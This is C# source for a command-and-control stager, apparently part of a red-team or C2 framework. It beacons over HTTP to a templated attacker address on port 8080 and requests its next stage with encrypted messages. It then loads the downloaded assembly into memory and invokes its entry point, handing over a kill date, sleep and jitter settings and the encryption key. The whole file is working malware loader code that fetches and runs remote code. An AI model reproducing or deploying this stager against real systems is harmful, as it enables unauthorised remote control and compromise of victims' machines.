﻿using Shared.Models;
using Shared.Utilities;

using Stager.Comms;
using Stager.Models;

using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;

namespace Stager
{
    public class Stager
    {
        static string AgentID;

        static CommModule CommModule;
        static StagerModule StagerModule;

        static bool Staged = false;

        public delegate void StagerCommand(C2Data C2Data);

        public Stager()
        {
            Execute();
        }

        static void Main(string[] args)
        {
            new Stager();
        }

        public static void Execute()
        {
            AgentID = Utilities.GetRandomString(6);

            StagerModule = new StagerModule
            {
                Commands = new List<StagerModule.StagerCommand>
                {
                    new StagerModule.StagerCommand
                    {
                        Name = "StageResponse",
                        Delegate = StageResponse
                    }
                }
            };

            CommModule = new HTTPCommModule(AgentID, ConnectAddress, ConnectPort);
            SendStageRequest();
            CommModule.Start();

            while (!Staged)
            {
                if (CommModule.RecvData(out AgentMessage Message))
                {
                    var c2Data = Crypto.Decrypt<C2Data>(Message.Data, Message.IV);

                    var callback = StagerModule.Commands
                        .FirstOrDefault(c => c.Name.Equals(c2Data.Command, StringComparison.OrdinalIgnoreCase))
                        .Delegate;

                    callback?.Invoke(c2Data);
                }
            }
        }

        static void SendStageRequest()
        {
            var c2Data = Crypto.Encrypt(
                new C2Data
                {
                    Module = "Core",
                    Command = "StageRequest"
                },
                out byte[] iv);

            CommModule.SendData(
                new AgentMessage
                {
                    AgentID = AgentID,
                    Data = c2Data,
                    IV = iv
                });
        }

        static void StageResponse(C2Data C2Data)
        {
            CommModule.Stop();
            Staged = true;

            var asm = Assembly.Load(C2Data.Data);

            asm.GetType("Agent.Stage").GetMethod("HTTPEntry").Invoke(null, new object[]
            {
                AgentID,
                KillDate,
                ConnectAddress,
                ConnectPort,
                SleepInterval,
                SleepJitter,
                Crypto.EncryptionKey
            });
        }

        static string ConnectAddress
        {
            get { return "<<ConnectAddress>>"; }
        }

        static int ConnectPort
        {
            get { return 8080; }
        }

        static int SleepInterval
        {
            get { return 5; }
        }

        static int SleepJitter
        {
            get { return 25; }
        }

        static DateTime KillDate
        {
            get { return DateTime.Parse("<<KillDate>>"); }
        }
    }
}